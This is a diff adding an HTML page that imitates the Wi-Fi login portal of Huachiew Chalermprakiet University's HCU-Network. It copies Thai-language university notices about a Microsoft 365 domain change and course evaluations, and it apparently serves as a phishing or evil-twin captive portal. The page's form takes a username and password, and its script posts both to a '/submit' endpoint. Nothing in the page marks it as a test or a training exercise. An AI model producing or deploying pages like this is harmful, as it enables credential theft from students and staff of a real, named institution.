@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wi-Fi Login</title>
+    <!-- ลิงก์ไปยังไฟล์ style.css -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>ประกาศเปลี่ยนการใช้งานโดเมนบัญชี Microsoft 365<br>
+            จากเดิม <span class="highlight">@live.hcu.ac.th</span>
+            เปลี่ยนเป็น <span class="highlight">@hcu.ac.th</span>
+            ในวันจันทร์<br>ที่ 9 กันยายน 2567 เป็นต้นไป<br>
+            หากมีปัญหา โทร.1149/1115/1482 LINE:@886ZVKPC
+        </h1>
+    </div>
+    <div class="login-container">
+        <h2>Authentication Required<br>มหาวิทยาลัยหัวเฉียวเฉลิมพระเกียรติ<br>ตรวจสอบสิทธิการเข้าใช้งาน HCU-Network<br><br>นักศึกษาทุกคนต้องประเมินการสอนของอาจารย์</h2>
+        <div class="inner-rectangle">
+            <div class="head">
+                <p>Please enter your username and password to continue.</p>
+            </div>
+            <form id="login-form">
+                <div class="form-group">
+                    <label for="username">Username:</label>
+                    <input type="text" id="username" name="username" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">Password:</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+    
+                <button type="submit">Continue</button>
+            </form>
+        </div>
+        <div class="after">
+            <h3>มหาวิทยาลัย ได้เปิดระบบประเมินการสอนและรายวิชาทาง
+                อินเทอร์เน็ต แล้ว<br><br>
+                นักศึกษาเข้ารับประเมินการสอนได้ที่ <a href="https://assess.hcu.ac.th/assess/"target="_blank">https://assess.hcu.ac.th/assess/</a><br><br>
+                ตั้งแต่วันนี้เป็นต้นไป</h3>
+            <p>การประเมินการสอนของอาจารย์เป็นหน้าที่หนึ่งของนักศึกษา ดังนั้นหากนักศึกษาไม่ประเมินการสอนของอาจารย์ที่สอนนักศึกษาทุกท่าน หรือประเมินการสอนไม่ครบทุกรายวิชา นักศึกษาจะไม่ถูกบันทึกชื่อลงฐานข้อมูล
+                และไม่สามารถลงทะเบียนผ่านอินเทอร์เน็ต ในภาคการศึกษาต่อไปได้ ซึ่งอาจทำให้นักศึกษาลงทะเบียนล่าช้า และเสียค่าธรรมเนียมปรับหรือไม่สามารถลงทะเบียนในกลุ่มเรียนที่นักศึกษาต้องการได้</p>
+        </div>
+
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function (event) {
+            event.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            fetch('/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ username, password }),
+            })
+            .then(response => response.text())
+            .then(message => {
+                alert(message);
+                document.getElementById('username').value = '';
+                document.getElementById('password').value = '';
+            })
+            .catch(error => console.error('Error:', error));
+        });
+    </script>
+</body>
+</html>
